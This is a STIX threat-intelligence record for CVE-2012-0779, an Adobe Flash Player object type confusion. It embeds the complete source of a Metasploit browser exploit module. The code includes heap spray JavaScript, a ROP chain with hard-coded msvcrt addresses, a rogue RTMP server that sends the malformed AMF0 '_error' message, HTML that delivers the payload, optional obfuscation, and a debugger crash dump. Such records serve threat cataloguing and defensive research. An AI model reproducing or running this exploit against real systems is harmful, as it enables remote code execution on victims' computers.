{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--445e8275-fc84-49ef-ac50-78e267484614",
    "created": "2024-08-14T16:44:02.86793Z",
    "modified": "2024-08-14T16:44:02.867934Z",
    "name": "\"Adobe Flash Player Object Type Confusion\"",
    "description": " This module exploits a vulnerability found in Adobe Flash Player.  By supplying a corrupt AMF0 \"_error\" response, it is possible to gain arbitrary remote code execution under the context of the user.  This vulnerability has been exploited in the wild as part of the \"World Uyghur Congress Invitation.doc\" e-mail attack. According to the advisory, 10.3.183.19 and 11.x before 11.2.202.235 are affected.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/adobe_flash_rtmp.rb",
            "external_id": "adobe_flash_rtmp.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-0779"
        },
        {
            "source_name": "reference",
            "url": "http://contagiodump.blogspot.com.es/2012/05/may-3-cve-2012-0779-world-uyghur.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2012/06/22/the-secret-sauce-to-cve-2012-0779-adobe-flash-object-confusion-vulnerability"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::RopDb\n  include Msf::Exploit::Remote::BrowserAutopwn\n\n  autopwn_info({\n    :os_name    => OperatingSystems::Match::WINDOWS,\n    :ua_name    => HttpClients::IE,\n    :ua_minver  => \"6.0\",\n    :ua_maxver  => \"8.0\",\n    :method     => \"GetVariable\",\n    :classid    => \"ShockwaveFlash.ShockwaveFlash\",\n    :rank       => NormalRanking, # reliable memory corruption\n    :javascript => true\n  })\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Adobe Flash Player Object Type Confusion\",\n      'Description'    => %q{\n        This module exploits a vulnerability found in Adobe Flash\n        Player.  By supplying a corrupt AMF0 \"_error\" response, it\n        is possible to gain arbitrary remote code execution under\n        the context of the user.\n\n        This vulnerability has been exploited in the wild as part of\n        the \"World Uyghur Congress Invitation.doc\" e-mail attack.\n        According to the advisory, 10.3.183.19 and 11.x before\n        11.2.202.235 are affected.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'sinn3r', # Metasploit module\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-0779' ],\n          [ 'OSVDB', '81656'],\n          [ 'BID', '53395' ],\n          [ 'URL', 'http://www.adobe.com/support/security/bulletins/apsb12-09.html'], # Patch info\n          [ 'URL', 'http://contagiodump.blogspot.com.es/2012/05/may-3-cve-2012-0779-world-uyghur.html' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2012/06/22/the-secret-sauce-to-cve-2012-0779-adobe-flash-object-confusion-vulnerability' ]\n        ],\n      'Payload'        =>\n        {\n          #'Space'    => 1024,\n          'BadChars' => \"\\x00\"\n        },\n      'DefaultOptions'  =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Flash Player 11.2.202.228\n          [ 'Automatic', {} ],\n          [\n            'IE 6 on Windows XP SP3',\n            {\n              'Rop'    => nil,\n              'RandomHeap' => false,\n              'Offset' => '0x0'\n            }\n          ],\n          [\n            'IE 7 on Windows XP SP3',\n            {\n              'Rop'    => nil,\n              'RandomHeap' => false,\n              'Offset' => '0x0'\n            }\n          ],\n          [\n            'IE 8 on Windows XP SP3 with msvcrt ROP',\n            {\n              'Rop' => :msvcrt,\n              'RandomHeap' => false,\n              'Offset' => '238',\n              'StackPivot' => 0x77c12100, # add esp, edx # retn 77 # from msvcrt.dll\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-05-04',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false]),\n        OptAddress.new('RTMPHOST', [ true, \"The local host to RTMP service listen on. This must be an address on the local machine or 0.0.0.0\", '0.0.0.0' ]),\n        OptPort.new('RTMPPORT',    [ true, \"The local port to RTMP service listen on.\", 1935 ]),\n      ], self.class\n    )\n\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    if agent =~ /NT 5\\.1/ and agent =~ /MSIE 6/\n      return targets[1]  #IE 6 on Windows XP SP3\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 7/\n      return targets[2]  #IE 7 on Windows XP SP3\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 8/\n      return targets[3]  #IE 8 on Windows XP SP3\n    else\n      return nil\n    end\n  end\n\n  def ret(t)\n    return [ 0x77c4ec01 ].pack(\"V\") # RETN (ROP NOP) # msvcrt.dll\n  end\n\n  def get_rop_chain(t)\n    print_status(\"Using msvcrt ROP\")\n    p = \"\\xbc\\x0c\\x0c\\x0c\\x0c\" #mov esp,0c0c0c0c ; my way of saying 'f you' to the problem\n    p << payload.encoded\n\n    code = ret(t)\n    code << rand_text(119)\n    code << generate_rop_payload('msvcrt', p, {'target'=>'xp'})\n    offset = 2616 - code.length\n    code << rand_text(offset)\n    code << [ t['StackPivot'] ].pack(\"V\")\n    return code\n  end\n\n  def get_easy_spray(t, js_code, js_nops)\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    spray = <<-JS\n    var heap_obj = new heapLib.ie(0x20000);\n    var code = unescape(\"#{js_code}\");\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n\n    while (nops.length < 0x80000) nops += nops;\n\n    var offset = nops.substring(0, #{t['Offset']});\n    var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\n\n    while (shellcode.length < 0x40000) shellcode += shellcode;\n    var block = shellcode.substring(0, (0x80000-6)/2);\n\n\n    heap_obj.gc();\n    for (var z=1; z < 0x185; z++) {\n      heap_obj.alloc(block);\n    }\n\n    JS\n\n    return spray\n\n  end\n\n\n  def get_aligned_spray(t, js_rop, js_nops)\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    spray = <<-JS\n\n    var heap_obj = new heapLib.ie(0x20000);\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n    var rop_chain = unescape(\"#{js_rop}\");\n\n    while (nops.length < 0x80000) nops += nops;\n\n    var offset = nops.substring(0, #{t['Offset']});\n    var shellcode = offset + rop_chain + nops.substring(0, 0x800-offset.length-rop_chain.length);\n\n\n    while (shellcode.length < 0x40000) shellcode += shellcode;\n    var block = shellcode.substring(0, (0x80000-6)/2);\n\n\n    heap_obj.gc();\n    for (var z=1; z < 0x1c5; z++) {\n      heap_obj.alloc(block);\n    }\n\n    JS\n\n    return spray\n\n  end\n\n  def exploit\n    @swf = create_swf\n\n    # Boilerplate required to handled pivoted listeners\n    comm = datastore['ListenerComm']\n    if comm == \"local\"\n      comm = ::Rex::Socket::Comm::Local\n    else\n      comm = nil\n    end\n\n    @rtmp_listener = Rex::Socket::TcpServer.create(\n      'LocalHost' => datastore['RTMPHOST'],\n      'LocalPort' => datastore['RTMPPORT'],\n      'Comm'      => comm,\n      'Context'   => {\n        'Msf'        => framework,\n        'MsfExploit' => self,\n      }\n    )\n\n    # Register callbacks\n    @rtmp_listener.on_client_connect_proc = Proc.new { |cli|\n      add_socket(cli)\n      print_status(\"#{cli.peerhost.ljust(16)} #{self.shortname} - Connected to RTMP\")\n      on_rtmp_connect(cli)\n    }\n\n    @rtmp_listener.start\n\n    super\n  end\n\n  def my_read(cli,size,timeout=nil)\n    if timeout.nil?\n      timeout = cli.def_read_timeout\n    end\n\n    buf = \"\"\n    ::Timeout::timeout(timeout) {\n      while buf.length < size\n      buf << cli.get_once(size - buf.length)\n      end\n    }\n    buf\n  end\n\n  def do_handshake(cli)\n    c0 = my_read(cli, 1)\n    c1 = my_read(cli, 1536) # HandshakeSize => 1536\n    s0 = \"\\3\" # s0\n    s1 = Rex::Text.rand_text(4) # s1.time\n    s1 << \"\\x00\\x00\\x00\\x00\" # s1.zero\n    s1 << Rex::Text.rand_text(1528) # s1.random_data\n    s2 = c1 # s2\n    cli.put(s0)\n    cli.put(s1)\n    cli.put(s2)\n    c2 = my_read(cli, 1536) # C2 (HandshakeSize => 1536)\n  end\n\n  def on_rtmp_connect(cli)\n\n    begin\n      do_handshake(cli)\n      request = my_read(cli, 341) # connect request length\n\n      case request\n      when /connect/\n        rtmp_header = \"\\x03\" # Chunk Stream ID\n        rtmp_header << \"\\x00\\x00\\x00\" # Timestamp\n        rtmp_header << \"\\x00\\x00\\x71\" # Body Size\n        rtmp_header << \"\\x14\" # AMF0 Command\n        rtmp_header << \"\\x00\\x00\\x00\\x00\" # Stream ID\n\n        # String\n        rtmp_body = \"\\x02\" # String\n        rtmp_body << \"\\x00\\x06\" # String length\n        rtmp_body << \"\\x5f\\x65\\x72\\x72\\x6f\\x72\" # String: _error\n        # Number\n        rtmp_body << \"\\x00\" # AMF Type: Number\n        rtmp_body << \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" # Number\n        # Array\n        rtmp_body << \"\\x0a\" # AMF Type: Array\n        rtmp_body << \"\\x00\\x00\\x00\\x05\" # Array length: 5\n        # Array elements\n        rtmp_body << \"\\x00\" # AMF Type: Number\n        rtmp_body << [rand(0x40000000)].pack(\"V\") + \"\\x00\\x00\\x00\\x00\" # Number\n        rtmp_body << \"\\x00\" # AMF Type: Number\n        rtmp_body << [rand(0x40000000)].pack(\"V\") + \"\\x00\\x00\\x00\\x00\" # Number\n        rtmp_body << \"\\x00\" # AMF Type: Number\n        rtmp_body << [rand(0x40000000)].pack(\"V\") + \"\\x00\\x00\\x00\\x00\" # Number\n        rtmp_body << \"\\x00\" # AMF Type: Number\n        rtmp_body << [rand(0x40000000)].pack(\"V\") + \"\\x00\\x00\\x00\\x00\" # Number\n        rtmp_body << \"\\x00\" # AMF Type: Number\n        rtmp_body << [rand(0x40000000)].pack(\"V\") + \"\\x00\\x00\\x00\\x00\" # Number\n        # Crafter Number\n        rtmp_body << \"\\x00\" # AMF Type: Number\n        rtmp_body << [rand(0x40000000)].pack(\"V\") + \"\\x0c\\x0c\\x0c\\x0c\" # Modify the \"\\x0c\\x0c\\x0c\\x0c\" to do an arbitrary call\n        # Number\n        rtmp_body << \"\\x00\" # AMF Type: Number\n        rtmp_body << [rand(0x40000000)].pack(\"V\") + \"\\x00\\x00\\x00\\x00\" # Number\n        # Number\n        rtmp_body << \"\\x00\" # AMF Type: Number\n        rtmp_body << [rand(0x40000000)].pack(\"V\") + \"\\x00\\x00\\x00\\x00\" # Number\n        # Number\n        rtmp_body << \"\\x00\" # AMF Type: Number\n        rtmp_body << [rand(0x40000000)].pack(\"V\") + \"\\x00\\x00\\x00\\x00\" # Number\n        # Number\n        rtmp_body << \"\\x00\" # AMF Type: Number\n        rtmp_body << [rand(0x40000000)].pack(\"V\") +  \"\\x00\\x00\\x00\\x00\" # Number\n\n        trigger = rtmp_header\n        trigger << rtmp_body\n\n        cli.put(trigger)\n        @rtmp_listener.close_client(cli)\n      end\n    rescue\n    ensure\n      @rtmp_listener.close_client(cli)\n      remove_socket(cli)\n    end\n\n  end\n\n  def cleanup\n    super\n    return if not @rtmp_listener\n\n    begin\n      @rtmp_listener.deref if @rtmp_listener.kind_of?(Rex::Service)\n      if @rtmp_listener.kind_of?(Rex::Socket)\n        @rtmp_listener.close\n        @rtmp_listener.stop\n      end\n      @rtmp_listener = nil\n    rescue ::Exception\n    end\n  end\n\n  def on_request_uri(cli, request)\n\n    agent = request.headers['User-Agent']\n    my_target = get_target(agent)\n\n    # Avoid the attack if the victim doesn't have the same setup we're targeting\n    if my_target.nil?\n      print_error(\"Browser not supported: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    print_status(\"Client requesting: #{request.uri}\")\n\n    if request.uri =~ /\\.swf$/\n      print_status(\"Sending Exploit SWF\")\n      send_response(cli, @swf, { 'Content-Type' => 'application/x-shockwave-flash' })\n      return\n    end\n\n    p = payload.encoded\n    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(my_target.arch))\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4, Rex::Arch.endian(my_target.arch))\n\n    if not my_target['Rop'].nil?\n      js_rop = Rex::Text.to_unescape(get_rop_chain(my_target), Rex::Arch.endian(my_target.arch))\n      js = get_aligned_spray(my_target, js_rop, js_nops)\n    else\n      js = get_easy_spray(my_target, js_code, js_nops)\n    end\n\n    js = heaplib(js, {:noobfu => true})\n\n    if datastore['OBFUSCATE']\n      js = ::Rex::Exploitation::JSObfu.new(js)\n      js.obfuscate(memory_sensitive: true)\n    end\n\n    swf_uri = ('/' == get_resource[-1,1]) ? get_resource[0, get_resource.length-1] : get_resource\n    swf_uri << \"/#{rand_text_alpha(rand(6)+3)}.swf\"\n\n    if datastore['RTMPHOST'] == '0.0.0.0'\n      rtmp_host = Rex::Socket.source_address('1.2.3.4')\n    else\n      rtmp_host = datastore['RTMPHOST']\n    end\n\n    rtmp_port = datastore['RTMPPORT']\n\n    html = %Q|\n    <html>\n    <head>\n    <script>\n    #{js}\n    </script>\n    </head>\n    <body>\n    <center>\n    <object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\"\n    id=\"test\" width=\"1\" height=\"1\"\n    codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab\">\n    <param name=\"movie\" value=\"#{swf_uri}\" />\n    <param name=\"FlashVars\" value=\"var1=#{rtmp_host}&var2=#{rtmp_port}\"\n    <embed src=\"#{swf_uri}\" quality=\"high\"\n    width=\"1\" height=\"1\" name=\"test\" align=\"middle\"\n    allowNetworking=\"all\"\n    type=\"application/x-shockwave-flash\"\n    pluginspage=\"http://www.macromedia.com/go/getflashplayer\"\n    FlashVars=\"var1=#{rtmp_host}&var2=#{rtmp_port}\">\n    </embed>\n\n    </object>\n    </center>\n\n    </body>\n    </html>\n    |\n\n    html = html.gsub(/^ {4}/, '')\n\n    print_status(\"Sending html\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n  end\n\n  def create_swf\n    path = ::File.join( Msf::Config.data_directory, \"exploits\", \"CVE-2012-0779.swf\" )\n    fd = ::File.open( path, \"rb\" )\n    swf = fd.read(fd.stat.size)\n    fd.close\n\n    return swf\n  end\nend\n\n=begin\n\n* Flash Player 11.2.202.228\n\n(348.540): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=02dbac01 ebx=0013e2e4 ecx=02dbac10 edx=44444444 esi=02dbac11 edi=00000000\neip=104b1b2d esp=0013e2bc ebp=0013e2c8 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00050202\nFlash32_11_2_202_228!DllUnregisterServer+0x300e84:\n104b1b2d 8b422c          mov     eax,dword ptr [edx+2Ch]\nds:0023:44444470=????????\n\n0:000> u eip\nFlash32_11_2_202_228!DllUnregisterServer+0x300e84:\n104b1b2d 8b422c          mov     eax,dword ptr [edx+2Ch]\n104b1b30 53              push    ebx\n104b1b31 ffd0            call    eax\n\n=end\n",
    "x_mitre_disclosure_date": "2012-05-04",
    "x_mitre_platforms": [
        "win'"
    ]
}